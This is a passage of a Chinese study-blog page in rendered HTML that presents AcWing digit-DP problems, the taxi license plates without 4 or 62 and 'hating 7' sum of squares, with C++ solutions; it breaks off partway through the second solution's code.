xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，但不是 连号，所以不属于不吉利数字之列。</p><p>你的任务是，对于每次给出的一个牌照号区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[n,m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span>，推断出交管局今后又要实际上给多少辆新的士车上牌照了。</p><p><strong>输入格式</strong></p><p>输入包含多组测试数据，每组数据占一行。</p><p>每组数据包含一个整数对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>。</p><p>当输入一行为“0 0”时，表示输入结束。</p><p><strong>输出格式</strong></p><p>对于每个整数对，输出一个不含有不吉利数字的统计个数，该数值占一行位置。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mi>m</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le m \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1 1000 0</code></pre><p><strong>输出样例：</strong></p><pre><code>80</code></pre><h3 id="题解-3">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算f[i][j]: i位, 且最高位为j的满足条件数的个数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">4</span>) <span class="keyword">continue</span>;</span><br><span class="line">    f[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">4</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">4</span> || (j == <span class="number">6</span> &amp;&amp; k == <span class="number">2</span>)) <span class="keyword">continue</span>;</span><br><span class="line">        f[i][j] += f[i - <span class="number">1</span>][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">4</span> || (last == <span class="number">6</span> &amp;&amp; j == <span class="number">2</span>)) <span class="keyword">continue</span>;</span><br><span class="line">      res += f[i + <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">4</span> || (last == <span class="number">6</span> &amp;&amp; x == <span class="number">2</span>)) <span class="keyword">break</span>;</span><br><span class="line">    last = x;</span><br><span class="line">    <span class="keyword">if</span> (!i) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r), l || r) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1086-恨7不成妻"><a href="https://www.acwing.com/problem/content/1088/">AcWing 1086. 恨7不成妻</a></h2><p>单身！</p><p>依然单身！</p><p>吉哥依然单身！</p><p>DS 级码农吉哥依然单身！</p><p>所以，他平生最恨情人节，不管是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>214</mn></mrow><annotation encoding="application/x-tex">214</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">214</span></span></span></span> 还是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>77</mn></mrow><annotation encoding="application/x-tex">77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">77</span></span></span></span>，他都讨厌！</p><p>吉哥观察了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>214</mn></mrow><annotation encoding="application/x-tex">214</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">214</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>77</mn></mrow><annotation encoding="application/x-tex">77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">77</span></span></span></span> 这两个数，发现：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>+</mo><mn>1</mn><mo>+</mo><mn>4</mn><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">2 + 1 + 4 = 7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn><mo>+</mo><mn>7</mn><mo>=</mo><mn>7</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">7 + 7 = 7 \times 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>77</mn><mo>=</mo><mn>7</mn><mo>×</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">77 = 7 \times 11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">77</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span></p><p>最终，他发现原来这一切归根到底都是因为和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 有关！</p><p>所以，他现在甚至讨厌一切和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 有关的数！</p><p>什么样的数和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 有关呢？</p><p>如果一个整数符合下面三个条件之一，那么我们就说这个整数和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 有关：</p><ol><li>整数中某一位是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>；</li><li>整数的每一位加起来的和是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 的整数倍；</li><li>这个整数是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 的整数倍。</li></ol><p>现在问题来了：吉哥想知道在一定区间内和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 无关的整数的平方和。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，表示共有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 组测试数据。</p><p>每组数据占一行，包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>对于每组数据，请计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>L</mi><mo separator="true">,</mo><mi>R</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[L,R]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">]</span></span></span></span> 中和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 无关的数字的平方和，并将结果对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>+</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">10^9+7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 取模后输出。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>T</mi><mo>≤</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">1 \le T \le 50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">50</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>L</mi><mo>≤</mo><mi>R</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">1 \le L \le R \le 10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>31 910 1117 17</code></pre><p><strong>输出样例：</strong></p><pre><code>2362210</code></pre><h3 id="题解-4">题解</h3><blockquote><p>大体看懂了，跟着y总敲了一遍，累，暂时没动力继续咯……</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">20</span>, N = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">F</span> &#123;</span><br><span class="line">  <span class="type">int</span> s0, s1, s2;</span><br><span class="line">&#125;f[kN][<span class="number">10</span>][<span class="number">7</span>][<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> power7[kN], power9[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mod</span><span class="params">(LL x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x % y + y) % y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">auto</span> &amp;v = f[<span class="number">1</span>][i][i % <span class="number">7</span>][i % <span class="number">7</span>];</span><br><span class="line">    v.s0++, v.s1 += i, v.s2 += i * i;</span><br><span class="line">  &#125;</span><br><span class="line">  LL power = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++, power *= <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span>; a &lt; <span class="number">7</span>; a++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">7</span>; b++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">auto</span> &amp;v1 = f[i][j][a][b], &amp;v2 = f[i - <span class="number">1</span>][k][<span class="built_in">mod</span>(a - j * power, <span class="number">7</span>)][<span class="built_in">mod</span>(b - j, <span class="number">7</span>)];</span><br><span class="line">            v1.s0 = <span class="built_in">mod</span>(v1.s0 + v2.s0, N);</span><br><span class="line">            v1.s1 = <span class="built_in">mod</span>(v1.s1 + v2.s1 + j * (power % N) % N * v2.s0, N);</span><br><span class="line">            v1.s2 = <span class="built_in">mod</span>(v1.s2 + </span><br><span class="line">                        j * j * (power % N) % N * (power % N) % N * v2.s0 + </span><br><span class="line">                        <span class="number">2</span> * j * power % N * v2.s1 + </span><br><span class="line">                        v2.s2,</span><br><span class="line">                        N);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  power7[<span class="number">0</span>] = power9[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    power7[i] = power7[i - <span class="number">1</span>] * <span class="number">10</span> % <span class="number">7</span>;</span><br><span class="line">    power9[i] = power9[i - <span class="number">1</span>] * <span class="number">10ll</span> % N;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">F <span class="title">get</span><span class="params">(<span 